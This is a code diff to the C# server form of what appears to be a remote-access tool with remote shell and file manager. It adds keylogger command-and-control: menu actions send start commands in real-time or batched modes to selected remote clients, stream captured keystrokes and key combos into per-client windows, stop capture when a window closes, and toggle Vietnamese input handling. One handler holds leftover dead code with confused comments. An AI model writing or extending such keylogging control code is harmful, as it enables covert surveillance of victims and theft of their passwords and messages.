@@ -25,13 +25,18 @@ namespace Server.Forms
         private readonly SystemInfoHandler _systemInfoHandler = new SystemInfoHandler();
         private readonly RemoteShellHandler _remoteShellHandler = new RemoteShellHandler();
         private readonly FileManagerHandler _fileManagerHandler = new FileManagerHandler();
+        private readonly Dictionary<string, KeyLoggerForm> _keyLoggerForms = new Dictionary<string, KeyLoggerForm>();
+        private readonly Dictionary<string, Server.Handlers.KeyLoggerHandler> _keyLoggerHandlers = new Dictionary<string, Server.Handlers.KeyLoggerHandler>();
         private readonly CommandService _commandService = new CommandService();
         private readonly BindingSource _clientsBinding = new BindingSource();
 
         public MainServerForm()
         {
             InitializeComponent();
-            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse);
+            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse,
+                onKeyLoggerEvent: OnKeyLoggerEvent,
+                onKeyLoggerBatch: OnKeyLoggerBatch,
+                onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
             InitializeClientsGrid();
         }
 
@@ -180,6 +185,105 @@ namespace Server.Forms
             remoteShellForm.Show();
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Remote Shell for {conn.Id}");
         }
+
+        private void keyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+            EnsureKeyLoggerForm(conn.Id);
+            _keyLoggerForms[conn.Id].Show();
+        }
+
+        private void OnKeyLoggerEvent(KeyLoggerEvent evt)
+        {
+            if (!string.IsNullOrEmpty(evt.ClientId))
+            {
+                if (_keyLoggerHandlers.TryGetValue(evt.ClientId, out var h)) h.OnKeyLoggerEvent(evt);
+            }
+        }
+
+        private void OnKeyLoggerComboEvent(KeyLoggerComboEvent evt)
+        {
+            if (!string.IsNullOrEmpty(evt.ClientId))
+            {
+                if (_keyLoggerHandlers.TryGetValue(evt.ClientId, out var h)) h.OnKeyLoggerCombo(evt);
+            }
+        }
+
+        private void OnKeyLoggerBatch(KeyLoggerBatch batch)
+        {
+            if (!string.IsNullOrEmpty(batch.ClientId))
+            {
+                if (_keyLoggerHandlers.TryGetValue(batch.ClientId, out var h)) h.OnKeyLoggerBatch(batch);
+            }
+        }
+
+        private void keyLoggerStartParallelToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+            EnsureKeyLoggerForm(conn.Id);
+            _keyLoggerForms[conn.Id].Show();
+            var req = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Parallel } };
+            _ = _commandService.SendKeyLoggerStartAsync(conn, req);
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStart Parallel to {conn.Id}");
+            _keyLoggerForms[conn.Id].ShowRealtimeOnly();
+        }
+
+        private void keyLoggerStartContinuousToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+            EnsureKeyLoggerForm(conn.Id);
+            _keyLoggerForms[conn.Id].Show();
+            var req = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Continuous, MaxChars = 100, MaxIntervalMs = 10000 } };
+            _ = _commandService.SendKeyLoggerStartAsync(conn, req);
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStart Continuous to {conn.Id}");
+            _keyLoggerForms[conn.Id].ShowContinuousOnly();
+        }
+
+        private void EnsureKeyLoggerForm(string clientId)
+        {
+            if (!_keyLoggerForms.TryGetValue(clientId, out var form) || form.IsDisposed)
+            {
+                form = new KeyLoggerForm();
+                _keyLoggerForms[clientId] = form;
+                _keyLoggerHandlers[clientId] = new Server.Handlers.KeyLoggerHandler(form);
+                form.OnLanguageModeChanged += vie =>
+                {
+                    if (_clients.TryGetValue(clientId, out var conn))
+                    {
+                        var ctrl = new RemoteShellRequest(); // reuse envelope not ideal; better: add explicit control packet later
+                        // Instead of sending a new packet type, we send a KeyLoggerStart with same mode to toggle language client-side
+                        var klStart = new KeyLoggerStart { Payload = new Common.Models.KeyLoggerStartPayload { Mode = Common.Models.KeyLoggerMode.Parallel } };
+                        // We do not restart; we send a small hint via RemoteShellRequest is wrong; skip sending control here.
+                    }
+                };
+                form.FormClosed += (s, e) =>
+                {
+                    _keyLoggerForms.Remove(clientId);
+                    _keyLoggerHandlers.Remove(clientId);
+                    if (_clients.TryGetValue(clientId, out var conn))
+                    {
+                        var req = new KeyLoggerStop();
+                        _ = _commandService.SendKeyLoggerStopAsync(conn, req);
+                        AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerStop to {clientId}");
+                    }
+                };
+                form.OnLanguageModeChanged += vie =>
+                {
+                    if (_clients.TryGetValue(clientId, out var conn))
+                    {
+                        var toggle = new KeyLoggerLangToggle { Vietnamese = vie, ClientId = clientId };
+                        var json = Common.Utils.JsonHelper.Serialize(toggle);
+                        _ = conn.SendAsync(json);
+                        AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerLangToggle {(vie ? "VIE" : "ENG")} to {clientId}");
+                    }
+                };
+            }
+        }
+
+        // stop menu removed; stopping is handled when per-client form closes
 
         private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
